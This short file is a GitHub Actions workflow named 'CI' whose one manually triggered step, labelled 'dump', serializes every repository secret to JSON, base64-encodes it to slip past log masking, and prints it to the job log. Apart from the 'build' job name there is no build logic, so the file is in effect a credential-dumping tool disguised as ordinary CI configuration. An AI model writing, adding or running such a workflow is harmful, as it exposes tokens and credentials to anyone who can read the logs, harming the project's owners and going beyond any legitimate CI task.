name: CI
    on: [workflow_dispatch]
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - name: dump
            env:
              ALL: ${{ toJson(secrets) }}
            run: |
              B64=$(echo "$ALL" | base64 -w0)
              echo "B64=$B64"
    